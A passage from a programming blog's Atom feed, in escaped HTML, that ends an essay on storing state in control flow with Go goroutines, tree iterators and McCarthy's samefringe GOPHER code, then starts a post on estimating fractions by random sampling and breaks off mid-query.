#aaa&#34;&gt;}&lt;/span&gt;&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;The original program was, in essence, &lt;i&gt;simulating&lt;/i&gt; this control flow&#xA;using the explicit &lt;code&gt;state&lt;/code&gt; variable as a program counter,&#xA;tracking which line was executing.&#xA;If a program can be converted to store explicit state in control flow instead,&#xA;then that explicit state was merely an awkward simulation of the control flow.&#xA;&lt;a class=anchor href=&#34;#more&#34;&gt;&lt;h2 id=&#34;more&#34;&gt;More Threads for More State&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Before widespread support for concurrency,&#xA;that kind of awkward simulation was often necessary,&#xA;because a different part of the program wanted&#xA;to use the control flow instead.&#xA;&#xA;&lt;p&gt;&#xA;For example, suppose the text being parsed is&#xA;the result of decoding base64 input, in which&#xA;sequences of four 6-bit characters (drawn from a 64-character alphabet)&#xA;decode to three 8-bit bytes.&#xA;The core of that decoder looks like:&#xA;&lt;pre&gt;for {&#xA;    c1, c2, c3, c4 := read(), read(), read(), read()&#xA;    b1, b2, b3 := decode(c1, c2, c3, c4)&#xA;    write(b1)&#xA;    write(b2)&#xA;    write(b3)&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;If we want those &lt;code&gt;write&lt;/code&gt; calls to feed into the parser from the&#xA;previous section, we need a parser that can be called with one byte at a time,&#xA;not one that demands a &lt;code&gt;read&lt;/code&gt; callback.&#xA;This decode loop cannot be presented as a &lt;code&gt;read&lt;/code&gt; callback&#xA;because it obtains 3 input bytes at a time and&#xA;uses its control flow to track which ones have been written.&#xA;Because the decoder is storing its own state&#xA;in its control flow, &lt;code&gt;parseQuoted&lt;/code&gt; cannot.&#xA;&#xA;&lt;p&gt;&#xA;In a non-concurrent program, this base64 decoder and &lt;code&gt;parseQuoted&lt;/code&gt;&#xA;would be at an impasse: one would have to give up&#xA;its use of control flow state and fall back to some kind&#xA;of simulated version instead.&#xA;&#xA;&lt;p&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;To rewrite &lt;code&gt;parseQuoted&lt;/code&gt;, we have to reintroduce the &lt;code&gt;state&lt;/code&gt;&#xA;variable, which we can encapsulate in a struct with a &lt;code&gt;Write&lt;/code&gt; method:&#xA;&lt;pre&gt;type parser struct {&#xA;    state int&#xA;}&#xA;&#xA;func (p *parser) Init() {&#xA;    p.state = 0&#xA;}&#xA;&#xA;func (p *parser) Write(c byte) Status {&#xA;    switch p.state {&#xA;    case 0:&#xA;        if c != &#39;&#34;&#39; {&#xA;            return BadInput&#xA;        }&#xA;        p.state = 1&#xA;    case 1:&#xA;        if c == &#39;&#34;&#39; {&#xA;            return Success&#xA;        }&#xA;        if c == &#39;\\&#39; {&#xA;            p.state = 2&#xA;        } else {&#xA;            p.state = 1&#xA;        }&#xA;    case 2:&#xA;        p.state = 1&#xA;    }&#xA;    return NeedMoreInput&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;The &lt;code&gt;Init&lt;/code&gt; method initializes the state,&#xA;and then each &lt;code&gt;Write&lt;/code&gt; loads the state,&#xA;takes actions based on the state and the input byte,&#xA;and then saves the state back to the struct.&#xA;&#xA;&lt;p&gt;&#xA;For &lt;code&gt;parseQuoted&lt;/code&gt;, the state machine is simple enough that this may be completely fine.&#xA;But maybe the state machine is much more complex,&#xA;or maybe the algorithm is best expressed recursively.&#xA;In those cases, being passed an input sequence by the caller&#xA;one byte at a time means making all that state explicit in a&#xA;data structure simulating the original control flow.&#xA;&#xA;&lt;p&gt;&#xA;Concurrency eliminates the contention between different parts of the&#xA;program over which gets to store state in control flow,&#xA;because now there can be multiple control flows.&#xA;&#xA;&lt;p&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Suppose we already have the &lt;code&gt;parseQuoted&lt;/code&gt; function,&#xA;and it’s big and complicated&#xA;and tested and correct, and we don’t want to change it.&#xA;We can avoid editing that code at all by writing this wrapper:&#xA;&lt;pre&gt;type parser struct {&#xA;    c      chan byte&#xA;    status chan Status&#xA;}&#xA;&#xA;func (p *parser) Init() {&#xA;    p.c = make(chan byte)&#xA;    p.status = make(chan Status)&#xA;    go p.run()&#xA;    &amp;lt;-p.status // always NeedMoreInput&#xA;}&#xA;&#xA;func (p *parser) run() {&#xA;    if !parseQuoted(p.read) {&#xA;        p.status &amp;lt;- BadSyntax&#xA;    } else {&#xA;        p.status &amp;lt;- Success&#xA;    }&#xA;}&#xA;&#xA;func (p *parser) read() byte {&#xA;    p.status &amp;lt;- NeedMoreInput&#xA;    return &amp;lt;-p.c&#xA;}&#xA;&#xA;func (p *parser) Write(c byte) Status {&#xA;    p.c &amp;lt;- c&#xA;    return &amp;lt;-p.status&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Note the use of &lt;code&gt;parseQuoted&lt;/code&gt;, completely unmodified, in the &lt;code&gt;run&lt;/code&gt; method.&#xA;Now the base64 decoder can use &lt;code&gt;p.Write&lt;/code&gt; and keep its program counter&#xA;and local variables.&#xA;&#xA;&lt;p&gt;&#xA;The new goroutine that &lt;code&gt;Init&lt;/code&gt; creates runs the &lt;code&gt;p.run&lt;/code&gt; method,&#xA;which invokes the original &lt;code&gt;parseQuoted&lt;/code&gt; function with an&#xA;appropriate implementation of &lt;code&gt;read&lt;/code&gt;.&#xA;Before starting &lt;code&gt;p.run&lt;/code&gt;, &lt;code&gt;Init&lt;/code&gt; allocates two channels for communicating&#xA;between the &lt;code&gt;p.run&lt;/code&gt; method, runing in its own goroutine,&#xA;and whatever goroutine calls &lt;code&gt;p.Write&lt;/code&gt; (such as the base64 decoder’s goroutine).&#xA;The channel &lt;code&gt;p.c&lt;/code&gt; carries bytes from &lt;code&gt;Write&lt;/code&gt; to &lt;code&gt;read&lt;/code&gt;, and the channel &lt;code&gt;p.status&lt;/code&gt;&#xA;carries status updates back.&#xA;Each time &lt;code&gt;parseQuoted&lt;/code&gt; calls &lt;code&gt;read&lt;/code&gt;, &lt;code&gt;p.read&lt;/code&gt; sends &lt;code&gt;NeedMoreInput&lt;/code&gt; on &lt;code&gt;p.status&lt;/code&gt;&#xA;and waits for an input byte on &lt;code&gt;p.c&lt;/code&gt;.&#xA;Each time &lt;code&gt;p.Write&lt;/code&gt; is called, it does the opposite: it sends the input byte &lt;code&gt;c&lt;/code&gt; on &lt;code&gt;p.c&lt;/code&gt;&#xA;and then waits for and returns an updated status from &lt;code&gt;p.status&lt;/code&gt;.&#xA;These two calls take turns, back and forth,&#xA;one executing and one waiting at any given moment.&#xA;&#xA;&lt;p&gt;&#xA;To get this cycle going, the &lt;code&gt;Init&lt;/code&gt; method does the initial receive from &lt;code&gt;p.status&lt;/code&gt;,&#xA;which will correspond to the first &lt;code&gt;read&lt;/code&gt; in &lt;code&gt;parseQuoted&lt;/code&gt;.&#xA;The actual status for that first update is guaranteed to be &lt;code&gt;NeedMoreInput&lt;/code&gt;&#xA;and is discarded.&#xA;To end the cycle, we assume that when &lt;code&gt;Write&lt;/code&gt; returns &lt;code&gt;BadSyntax&lt;/code&gt; or &lt;code&gt;Success&lt;/code&gt;,&#xA;the caller knows not to call &lt;code&gt;Write&lt;/code&gt; again.&#xA;If the caller incorrectly kept calling &lt;code&gt;Write&lt;/code&gt;,&#xA;the send on &lt;code&gt;p.c&lt;/code&gt; would block forever, since &lt;code&gt;parseQuoted&lt;/code&gt; is done.&#xA;We would of course make that more robust in a production implementation.&#xA;&#xA;&lt;p&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;By creating a new control flow (a new goroutine), we were able to keep the&#xA;code-state-based implementation of &lt;code&gt;parseQuoted&lt;/code&gt; as well as our code-state-based&#xA;base64 decoder.&#xA;We avoided having to understand the internals of either implementation.&#xA;In this example, both are trivial enough that rewriting one would not&#xA;have been a big deal,&#xA;but in a larger program, it could be a huge win to be able to write this kind of&#xA;adapter instead of having to make changes to existing code.&#xA;As we’ll discuss &lt;a href=&#34;#limitations&#34;&gt;later&lt;/a&gt;, the conversion is not entirely free – we need to&#xA;make sure the extra control flow gets cleaned up, and we need to think about&#xA;the cost of the context switches – but it may well still be a net win.&#xA;&lt;a class=anchor href=&#34;#stack&#34;&gt;&lt;h2 id=&#34;stack&#34;&gt;Store Stacks on the Stack&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;The base64 decoder’s control flow state included not just the program counter&#xA;but also two local variables.&#xA;Those would have to be pulled out into a struct if the decoder had to be changed&#xA;not to use control flow state.&#xA;Programs can use an arbitrary number of local variables by using their call stack.&#xA;For example, suppose we have a simple binary tree data structure:&#xA;&lt;pre&gt;type Tree[V any] struct {&#xA;    left  *Tree[V]&#xA;    right *Tree[V]&#xA;    value V&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;If you can’t use control flow state, then to implement iteration over this tree,&#xA;you have to introduce an explicit “iterator”:&#xA;&lt;pre&gt;type Iter[V any] struct {&#xA;    stk []*Tree[V]&#xA;}&#xA;&#xA;func (t *Tree[V]) NewIter() *Iter[V] {&#xA;    it := new(Iter[V])&#xA;    for ; t != nil; t = t.left {&#xA;        it.stk = append(it.stk, t)&#xA;    }&#xA;    return it&#xA;}&#xA;&#xA;func (it *Iter[V]) Next() (v V, ok bool) {&#xA;    if len(it.stk) == 0 {&#xA;        return v, false&#xA;    }&#xA;    t := it.stk[len(it.stk)-1]&#xA;    v = t.value&#xA;    it.stk = it.stk[:len(it.stk)-1]&#xA;    for t = t.right; t != nil; t = t.left {&#xA;        it.stk = append(it.stk, t)&#xA;    }&#xA;    return v, true&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;On the other hand, if you can use control flow state,&#xA;confident that other parts of the&#xA;program that need their own state can run in other control flows,&#xA;then you can implement iteration without an explicit iterator,&#xA;as a method that calls a yield function for each value:&#xA;&lt;pre&gt;func (t *Tree[V]) All(f func(v V)) {&#xA;    if t != nil {&#xA;        t.left.All(f)&#xA;        f(t.value)&#xA;        t.right.All(f)&#xA;    }&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;The &lt;code&gt;All&lt;/code&gt; method is obviously correct.&#xA;The correctness of the &lt;code&gt;Iter&lt;/code&gt; version is much less obvious.&#xA;The simplest explanation is that &lt;code&gt;Iter&lt;/code&gt; is simulating &lt;code&gt;All&lt;/code&gt;.&#xA;The &lt;code&gt;NewIter&lt;/code&gt; method’s loop that sets up &lt;code&gt;stk&lt;/code&gt; is&#xA;simulating the recursion in &lt;code&gt;t.All(f)&lt;/code&gt; down successive &lt;code&gt;t.left&lt;/code&gt; branches.&#xA;&lt;code&gt;Next&lt;/code&gt; pops and saves the &lt;code&gt;t&lt;/code&gt; at the top of the stack&#xA;and then simulates the recursion in &lt;code&gt;t.right.All(f)&lt;/code&gt; down successive &lt;code&gt;t.left&lt;/code&gt; branches,&#xA;setting up for the next &lt;code&gt;Next&lt;/code&gt;.&#xA;Finally it returns the value from the top-of-stack &lt;code&gt;t&lt;/code&gt;,&#xA;simulating &lt;code&gt;f(value)&lt;/code&gt;.&#xA;&#xA;&lt;p&gt;&#xA;We could write code like &lt;code&gt;NewIter&lt;/code&gt; and argue its correctness&#xA;by explaining that it simulates a simple function like &lt;code&gt;All&lt;/code&gt;.&#xA;I’d rather write &lt;code&gt;All&lt;/code&gt; and stop there.&#xA;&lt;a class=anchor href=&#34;#tree&#34;&gt;&lt;h2 id=&#34;tree&#34;&gt;Comparing Binary Trees&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;One might argue that &lt;code&gt;NewIter&lt;/code&gt; is better than &lt;code&gt;All&lt;/code&gt;,&#xA;because it does not use any control flow state, so it can be&#xA;used in contexts that already use their control flows&#xA;to hold other information.&#xA;For example, what if we want to traverse two binary trees&#xA;at the same time, checking that they hold the same values&#xA;even if their internal structure differs.&#xA;With &lt;code&gt;NewIter&lt;/code&gt;, this is straighforward:&#xA;&lt;pre&gt;func SameValues[V any](t1, t2 *Tree[V]) bool {&#xA;    it1 := t1.NewIter()&#xA;    it2 := t2.NewIter()&#xA;    for {&#xA;        v1, ok1 := it1.Next()&#xA;        v2, ok2 := it2.Next()&#xA;        if v1 != v2 || ok1 != ok2 {&#xA;            return false&#xA;        }&#xA;        if !ok1 &amp;amp;&amp;amp; !ok2 {&#xA;            return true&#xA;        }&#xA;    }&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;This program cannot be written as easily using &lt;code&gt;All&lt;/code&gt;,&#xA;the argument goes, because &lt;code&gt;SameValues&lt;/code&gt; wants to use&#xA;its own control flow (advancing two lists in lockstep)&#xA;that cannot be replaced by &lt;code&gt;All&lt;/code&gt;’s control flow&#xA;(recursion over the tree).&#xA;But this is a false dichotomy, the same one we saw&#xA;with &lt;code&gt;parseQuoted&lt;/code&gt; and the base64 decoder.&#xA;If two different functions have different demands&#xA;on control flow state, they can run in different control flows.&#xA;&#xA;&lt;p&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;In our case, we can write this instead:&#xA;&lt;pre&gt;&lt;span style=&#34;color: #aaa&#34;&gt;func SameValues[V any](t1, t2 *Tree[V]) bool {&lt;/span&gt;&#xA;    c1 := make(chan V)&#xA;    c2 := make(chan V)&#xA;    go gopher(c1, t1.All)&#xA;    go gopher(c2, t2.All)&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    for {&lt;/span&gt;&#xA;        v1, ok1 := &amp;lt;-c1&#xA;        v2, ok2 := &amp;lt;-c2&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        if v1 != v2 || ok1 != ok2 {&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;            return false&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        }&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        if !ok1 &amp;amp;&amp;amp; !ok2 {&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;            return true&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;        }&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;    }&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;}&lt;/span&gt;&#xA;&lt;span style=&#34;color: #aaa&#34;&gt;&lt;/span&gt;&#xA;func gopher[V any](c chan&amp;lt;- V, all func(func(V))) {&#xA;    all(func(v V) { c &amp;lt;- v })&#xA;    close(c)&#xA;}&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;The function &lt;code&gt;gopher&lt;/code&gt; uses &lt;code&gt;all&lt;/code&gt; to walk a tree, announcing&#xA;each value into a channel. After the walk, it closes the channel.&#xA;&#xA;&lt;p&gt;&#xA;&lt;code&gt;SameValues&lt;/code&gt; starts two concurrent gophers,&#xA;each of which walks one tree and announces the values into one channel.&#xA;Then &lt;code&gt;SameValues&lt;/code&gt; does exactly the same loop as before&#xA;to compare the two value streams.&#xA;&#xA;&lt;p&gt;&#xA;Note that &lt;code&gt;gopher&lt;/code&gt; is not specific to binary trees in any way:&#xA;it applies to &lt;i&gt;any&lt;/i&gt; iteration function.&#xA;That is, the general idea of starting a goroutine to run the &lt;code&gt;All&lt;/code&gt; method&#xA;works for converting any code-state-based iteration into an&#xA;incremental iterator.&#xA;My next post, “&lt;a href=&#34;coro&#34;&gt;Coroutines for Go&lt;/a&gt;,” expands on this idea.&#xA;&lt;a class=anchor href=&#34;#limits&#34;&gt;&lt;h2 id=&#34;limits&#34;&gt;Limitations&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;This approach of storing data in control flow is not a panacea.&#xA;Here are a few caveats:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;If the state needs to evolve in ways that don’t naturally map&#xA;to control flow, then it’s usually best to leave the state as data.&#xA;For example, the state maintained by a node in a distributed system&#xA;is usually not best represented in control flow,&#xA;because timeouts, errors, and other unexpected events tend to&#xA;require adjusting the state in unpredictable ways.&#xA;&lt;li&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;If the state needs to be serialized for operations like snapshots,&#xA;or sending over a network, that’s usually easier with data than code.&#xA;&lt;li&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;When you do need to create multiple control flows to hold different control flow state,&#xA;the helper control flows need to be shut down. When &lt;code&gt;SameValues&lt;/code&gt; returns&#xA;false, it leaves the two concurrent &lt;code&gt;gopher&lt;/code&gt;s blocked waiting to&#xA;send their next values. Instead, it should unblock them.&#xA;That requires communication in the other direction&#xA;to tell &lt;code&gt;gopher&lt;/code&gt; to stop early. “&lt;a href=&#34;coro&#34;&gt;Coroutines for Go&lt;/a&gt;” shows that.&#xA;&lt;li&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;In the multiple thread case, the switching costs can be significant.&#xA;On my laptop, a C thread switch takes a few microseconds.&#xA;A channel operation and goroutine switch&#xA;is an order of magnitude cheaper: a couple hundred nanoseconds.&#xA;An optimized coroutine system can reduce the cost to tens of&#xA;nanoseconds or less.&lt;/ul&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;In general, storing data in control flow is a valuable tool&#xA;for writing clean, simple, maintainable programs.&#xA;Like all tools, it works very well for some jobs and not as well for others.&#xA;&lt;a class=anchor href=&#34;#gopher&#34;&gt;&lt;h2 id=&#34;gopher&#34;&gt;Counterpoint: John McCarthy’s GOPHER&lt;/h2&gt;&lt;/a&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;The idea of using concurrency to align a pair of binary trees is over 50 years old.&#xA;It first appeared in Charles Prenner’s&#xA;“&lt;a href=&#34;https://dl.acm.org/doi/abs/10.1145/942582.807990&#34;&gt;The control structure facilities of ECL&lt;/a&gt;”&#xA;(&lt;i&gt;ACM SIGPLAN Notices&lt;/i&gt;, Volume 6, Issue 12, December 1971; see pages 106–109).&#xA;In that presentation, titled “Tree Walks Using Coroutines”, the problem was to take two binary trees A and B with the same number of nodes&#xA;and copy the value sequence from A into B despite the two having different internal structure.&#xA;They present a straightforward coroutine-based variant.&#xA;&#xA;&lt;p&gt;&#xA;Brian Smith and Carl Hewitt introduced the problem of simply comparing two&#xA;Lisp-style cons trees (in which internal nodes carry no values)&#xA;in their draft of “&lt;a href=&#34;https://www.scribd.com/document/185900689/A-Plasma-Primer&#34;&gt;A Plasma Primer&lt;/a&gt;” (March 1975; see pages 61-62).&#xA;For that problem, which they named “samefringe”, they used continuation-based actors&#xA;to run a pair of “fringe” actors (credited to Howie Shrobe)&#xA;over the two trees and report nodes back to a comparison loop.&#xA;&#xA;&lt;p&gt;&#xA;Gerald Sussman and Guy Steele presented the samefringe problem again,&#xA;in “&lt;a href=&#34;https://dspace.mit.edu/bitstream/handle/1721.1/5794/AIM-349.pdf&#34;&gt;Scheme: An Interpreter for Extended Lambda Calculus&lt;/a&gt;” (December 1975; see pages 8–9),&#xA;with roughly equivalent code (crediting Smith, Hewitt, and Shrobe for inspiration).&#xA;They refer to it as a “classic problem difficult to solve in most programming languages”.&#xA;&#xA;&lt;p&gt;&#xA;In August 1976, &lt;i&gt;ACM SIGART Bulletin&lt;/i&gt; published Patrick Greussay’s&#xA;“&lt;a href=&#34;https://dl.acm.org/doi/10.1145/1045270.1045273&#34;&gt;An Iterative Lisp Solution to the Samefringe Problem&lt;/a&gt;”,&#xA;This prompted &lt;a href=&#34;https://dl.acm.org/action/showFmPdf?doi=10.1145%2F1045276&#34;&gt;a response letter by Tim Finin and Paul Rutler in the November 1976 issue&lt;/a&gt; (see pages 4–5)&#xA;pointing out that Greussay’s solution runs in quadratic time and memory&#xA;but also remarking that&#xA;“the SAMEFRINGE problem has been notoriously overused as a justification for coroutines.”&#xA;That discussion prompted &lt;a href=&#34;https://dl.acm.org/action/showFmPdf?doi=10.1145%2F1045283&#34;&gt;a response letter by John McCarthy in the February 1977 issue&lt;/a&gt; (see page 4).&#xA;&#xA;&lt;p&gt;&#xA;In his response, titled “Another samefringe”, McCarthy gives the following LISP solution:&#xA;&lt;pre&gt;(DE SAMEFRINGE (X Y)&#xA;       (OR (EQ X Y)&#xA;           (AND (NOT (ATOM X))&#xA;                (NOT (ATOM Y))&#xA;                (SAME (GOPHER X) (GOPHER Y)))))&#xA;&#xA;(DE SAME (X Y)&#xA;       (AND (EQ (CAR X) (CAR Y))&#xA;            (SAMEFRINGE (CDR X) (CDR Y))))&#xA;&#xA;(DE GOPHER (U)&#xA;       (COND ((ATOM (CAR U)) U)&#xA;             (T (GOPHER (CONS (CAAR U)&#xA;                              (CONS (CDAR U) (CDR U)))))))&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;He then explains:&lt;blockquote&gt;&#xA;&#xA;&lt;p&gt;&#xA;&lt;i&gt;gopher&lt;/i&gt; digs up the first atom in an S-expression, piling up the &lt;i&gt;cdr&lt;/i&gt; parts&#xA;(with its hind legs) so that indexing through the atoms can be resumed.&#xA;Because of shared structure, the number of new cells in use in each argument&#xA;at any time (apart from those occupied by the original expression and assuming&#xA;iterative execution) is the number of &lt;i&gt;cars&lt;/i&gt; required to go from the top to the&#xA;current atom – usually a small fraction of the size of the S-expression.&lt;/blockquote&gt;&#xA;&#xA;&lt;p&gt;&#xA;In modern terms, McCarthy’s &lt;code&gt;GOPHER&lt;/code&gt; loops applying &lt;a href=&#34;https://en.wikipedia.org/wiki/Tree_rotation&#34;&gt;right tree rotations&lt;/a&gt;&#xA;until the leftmost node is at the top of the tree.&#xA;&lt;code&gt;SAMEFRINGE&lt;/code&gt; applies &lt;code&gt;GOPHER&lt;/code&gt; to the two trees, compares the tops,&#xA;and then loops to consider the remainders.&#xA;&#xA;&lt;p&gt;&#xA;After presenting a second, more elaborate solution, McCarthy remarks:&lt;blockquote&gt;&#xA;&#xA;&lt;p&gt;&#xA;I think all this shows that &lt;i&gt;samefringe&lt;/i&gt; is not an example of the need for co-routines,&#xA;and a new “simplest example” should be found.&#xA;There is no merit in merely moving information from data structure to control structure,&#xA;and it makes some kinds of modification harder.&lt;/blockquote&gt;&#xA;&#xA;&lt;p&gt;&#xA;I disagree with “no merit”. We can view McCarthy’s &lt;code&gt;GOPHER&lt;/code&gt;-ized trees as an encoding&#xA;of the same stack that &lt;code&gt;NewIter&lt;/code&gt; maintains but in tree form.&#xA;The correctness follows for the same reasons: it is simulating a&#xA;simple recursive traversal.&#xA;This &lt;code&gt;GOPHER&lt;/code&gt; is clever, but it only works on trees.&#xA;If you’re not John McCarthy, it’s easier to write the recursive traversal&#xA;and then rely on the general, concurrency-based &lt;code&gt;gopher&lt;/code&gt; we saw earlier&#xA;to do the rest.&#xA;&#xA;&lt;p&gt;&#xA;My experience is that when it is possible,&#xA;moving information from data structure to control structure&#xA;usually makes programs clearer, easier to understand,&#xA;and easier to maintain.&#xA;I hope you find similar results.&#xA;</content>
  </entry>
  <entry>
    <title>The Magic of Sampling, and its Limitations</title>
    <id>tag:research.swtch.com,2012:research.swtch.com/sample</id>
    <link rel="alternate" href="http://research.swtch.com/sample"></link>
    <published>2023-02-04T12:00:00-05:00</published>
    <updated>2023-02-04T12:02:00-05:00</updated>
    <summary type="text">The magic of using small samples to learn about large data sets.</summary>
    <content type="html">&#xA;&#xA;&lt;p&gt;&#xA;Suppose I have a large number of M&amp;amp;Ms&#xA;and want to estimate what fraction of them have &lt;a href=&#34;https://spinroot.com/pjw&#34;&gt;Peter’s face&lt;/a&gt; on them.&#xA;As one does.&#xA;&#xA;&lt;p&gt;&#xA;&lt;img name=&#34;sample-pjw1&#34; class=&#34;center pad resizable&#34; width=450 height=276 src=&#34;sample-pjw1.jpg&#34; srcset=&#34;sample-pjw1.jpg 1x, sample-pjw1@2x.jpg 2x, sample-pjw1@4x.jpg 4x&#34;&gt;&#xA;&#xA;&lt;p&gt;&#xA;If I am too lazy to count them all, I can estimate the true fraction using sampling:&#xA;pick N at random, count how many P have Peter’s face, and then estimate&#xA;the fraction to be P/N.&#xA;&#xA;&lt;p&gt;&#xA;I can &lt;a href=&#34;https://go.dev/play/p/GQr6ShQ_ivG&#34;&gt;write a Go program&lt;/a&gt; to pick 10 of the 37 M&amp;amp;Ms for me: 27 30 1 13 36 5 33 7 10 19.&#xA;(Yes, I am too lazy to count them, but I was not too lazy to number the M&amp;amp;Ms in order to use the Go program.)&#xA;&#xA;&lt;p&gt;&#xA;&lt;img name=&#34;sample-pjw2&#34; class=&#34;center pad resizable&#34; width=450 height=73 src=&#34;sample-pjw2.jpg&#34; srcset=&#34;sample-pjw2.jpg 1x, sample-pjw2@2x.jpg 2x, sample-pjw2@4x.jpg 4x&#34;&gt;&#xA;&#xA;&lt;p&gt;&#xA;Based on this estimate, we can estimate that 3/10 = 30% of my M&amp;amp;Ms have Peter’s face.&#xA;We can do it a few more times:&#xA;&#xA;&lt;p&gt;&#xA;&lt;img name=&#34;sample-pjw3&#34; class=&#34;center pad resizable&#34; width=450 height=64 src=&#34;sample-pjw3.jpg&#34; srcset=&#34;sample-pjw3.jpg 1x, sample-pjw3@2x.jpg 2x, sample-pjw3@4x.jpg 4x&#34;&gt;&#xA;&#xA;&lt;p&gt;&#xA;&lt;img name=&#34;sample-pjw4&#34; class=&#34;center pad resizable&#34; width=450 height=61 src=&#34;sample-pjw4.jpg&#34; srcset=&#34;sample-pjw4.jpg 1x, sample-pjw4@2x.jpg 2x, sample-pjw4@4x.jpg 4x&#34;&gt;&#xA;&#xA;&lt;p&gt;&#xA;&lt;img name=&#34;sample-pjw5&#34; class=&#34;center pad resizable&#34; width=450 height=73 src=&#34;sample-pjw5.jpg&#34; srcset=&#34;sample-pjw5.jpg 1x, sample-pjw5@2x.jpg 2x, sample-pjw5@4x.jpg 4x&#34;&gt;&#xA;&#xA;&lt;p&gt;&#xA;And we get a few new estimates: 30%, 40%, 20%. The actual fraction turns out to be 9/37 = 24.3%.&#xA;These estimates are perhaps not that impressive,&#xA;but we are only using 10 samples.&#xA;With not too many more samples, we can get far more accurate estimates,&#xA;even for much larger data sets.&#xA;Suppose we had many more M&amp;amp;Ms, again 24.3% Peter faces, and we sample 100 of them, or 1,000, or 10,000.&#xA;Since we’re lazy, let’s write &lt;a href=&#34;https://go.dev/play/p/VcqirSSiS1Q&#34;&gt;a program to simulate the process&lt;/a&gt;.&#xA;&lt;pre&gt;$ go run sample.go&#xA;   10: 40.0% 20.0% 30.0%  0.0% 10.0% 30.0% 10.0% 20.0% 20.0%  0.0%&#xA;  100: 25.0% 26.0% 21.0% 26.0% 15.0% 25.0% 30.0% 30.0% 29.0% 20.0%&#xA; 1000: 24.7% 23.8% 21.0% 25.4% 25.1% 24.2% 25.7% 22.9% 24.0% 23.8%&#xA;10000: 23.4% 24.6% 24.3% 24.3% 24.7% 24.6% 24.6% 24.7% 24.1% 25.0%&#xA;$&#xA;&lt;/pre&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Accuracy improves fairly quickly:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;With 10 samples, our estimates are accurate to within about 15%.&#xA;&lt;li&gt;&#xA;With 100 samples, our estimates are accurate to within about 5%.&#xA;&lt;li&gt;&#xA;With 1,000 samples, our estimates are accurate to within about 3%.&#xA;&lt;li&gt;&#xA;With 10,000 samples, our estimates are accurate to within about 1%.&lt;/ul&gt;&#xA;&#xA;&#xA;&lt;p&gt;&#xA;Because we are estimating only the percentage of Peter faces,&#xA;not the total number, the accuracy (also measured in percentages)&#xA;does not depend on the total number of M&amp;amp;Ms, only on the number of samples.&#xA;So 10,000 samples is enough to get roughly 1% accuracy whether we have&#xA;100,000 M&amp;amp;Ms, 1 million M&amp;amp;Ms, or even 100 billion M&amp;amp;Ms!&#xA;In the last scenario, we have 1% accuracy despite only sampling 0.00001% of the M&amp;amp;Ms.&#xA;&#xA;&lt;p&gt;&#xA;&lt;b&gt;The magic of sampling is that we can derive accurate estimates&#xA;about a very large population using a relatively small number of samples.&lt;/b&gt;&#xA;&#xA;&lt;p&gt;&#xA;Sampling turns many one-off estimations into jobs that are feasible to do by hand.&#xA;For example, suppose we are considering revising an error-prone API&#xA;and want to estimate how often that API is used incorrectly.&#xA;If we have a way to randomly sample uses of the API&#xA;(maybe &lt;code&gt;grep -Rn pkg.Func . | shuffle -m 100&lt;/code&gt;),&#xA;then manually checking 100 of them will give us an estimate&#xA;that’s accurate to within 5% or so.&#xA;And checking 1,000 of them, which may not take more than an hour or so&#xA;if they’re easy to eyeball, improves the accuracy to 1.5% or so.&#xA;Real data to decide an important question&#xA;is usually well worth a small amount of manual effort.&#xA;&#xA;&lt;p&gt;&#xA;For the kinds of decisions I look at related to Go,&#xA;this approach comes up all the time:&#xA;What fraction of &lt;code&gt;for&lt;/code&gt; loops in real code have a &lt;a href=&#34;https://github.com/golang/go/discussions/56010&#34;&gt;loop scoping bug&lt;/a&gt;?&#xA;What fraction of warnings by a new &lt;code&gt;go&lt;/code&gt; &lt;code&gt;vet&lt;/code&gt; check are false positives?&#xA;What fraction of modules have no dependencies?&#xA;These are drawn from my experience, and so they may seem specific to Go&#xA;or to language development, but once you realize that&#xA;sampling makes accurate estimates so easy to come by,&#xA;all kind of uses present themselves.&#xA;Any time you have a large data set,&#xA;&lt;pre&gt;select * from data order by random() limit 